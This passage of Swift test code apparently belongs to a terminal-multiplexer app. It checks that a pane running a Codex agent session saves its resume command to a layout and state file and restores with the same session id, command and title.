        func all(_ n: LayoutFile.NodeState) -> [LayoutFile.PaneState] { (n.pane.map { [$0] } ?? []) + (n.children ?? []).flatMap(all) }
        return all(w.root)
    }.first { $0.id == p.id }
    r.check("the layout saves the pane as a Codex session with its resume command",
            saved?.agent == "codex" && saved?.claudeSession == CodexFixture.sid && saved?.resumeCommand == p.resumeCommand)
    let exp: [String: Any] = ["pane": p.id, "resume": p.resumeCommand ?? ""]
    try? JSONSerialization.data(withJSONObject: exp).write(to: state.appendingPathComponent("codex-expect.json"))
    return finish(r, c)
}

@MainActor
func runCodexRestore() async -> Int32 {
    let r = Report()
    r.section = "codex restore"
    let state = URL(fileURLWithPath: env["LMUX_STATE_DIR"]!)
    guard let d = try? Data(contentsOf: state.appendingPathComponent("codex-expect.json")),
          let exp = try? JSONSerialization.jsonObject(with: d) as? [String: String],
          let id = exp["pane"], let resume = exp["resume"], !resume.isEmpty else {
        print("FAIL  [codex restore] no expectations from the --codex run")
        return 1
    }
    let c = makeController()
    let p = c.pane(id: id)
    r.check("the Codex pane comes back as a Codex session", p?.agentKind == .codex && p?.claudeSessionID == CodexFixture.sid)
    r.check("…and types its captured command: codex resume <flags> <id>",
            await sinks.wait(id, contains: resume, timeout: 5) && resume.contains(" resume -m gpt-6-luna "), sinks.text(id))
    r.check("…the restored title is the one the user gave it", p?.titleState.title == "my name")
    return finish(r, c)
}
